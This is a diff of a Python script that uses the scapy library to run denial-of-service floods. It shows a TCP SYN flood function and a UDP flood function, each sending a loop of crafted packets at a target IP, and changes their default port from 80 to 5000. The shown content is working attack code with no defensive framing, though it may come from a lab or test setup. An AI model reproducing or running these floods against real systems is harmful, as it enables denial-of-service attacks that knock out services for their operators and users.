@@ -6,7 +6,7 @@ from scapy.all import IP, TCP, UDP, ICMP, Raw, send
 # ------------------------
 # TCP SYN Flood
 # ------------------------
-def syn_flood(target_ip, target_port=80, count=1000):
+def syn_flood(target_ip, target_port=5000, count=1000):
     print(f"Executing TCP SYN Flood Attack: {target_ip}:{target_port} x{count}")
     for _ in range(count):
         pkt = IP(dst=target_ip)/TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
@@ -16,7 +16,7 @@ def syn_flood(target_ip, target_port=80, count=1000):
 # ------------------------
 # UDP Flood
 # ------------------------
-def udp_flood(target_ip, target_port=80, count=1000):
+def udp_flood(target_ip, target_port=5000, count=1000):
     print(f"Executing UDP Flood Attack: {target_ip}:{target_port} x{count}")
     for _ in range(count):
         pkt = IP(dst=target_ip)/UDP(dport=target_port)/Raw(load="X"*512)
